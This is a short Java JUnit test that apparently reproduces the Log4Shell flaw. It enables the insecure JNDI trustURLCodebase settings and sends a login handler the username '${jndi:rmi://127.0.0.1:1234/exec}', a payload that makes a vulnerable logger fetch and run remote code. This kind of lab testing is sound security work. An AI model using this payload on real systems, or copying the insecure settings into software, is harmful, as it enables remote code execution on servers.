package service;

import org.junit.Test;

import static org.junit.Assert.*;

public class LoginHandlerTest {

    @Test
    public void receiveUsername() {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        new LoginHandler().receiveUsername("${jndi:rmi://127.0.0.1:1234/exec}");
    }
}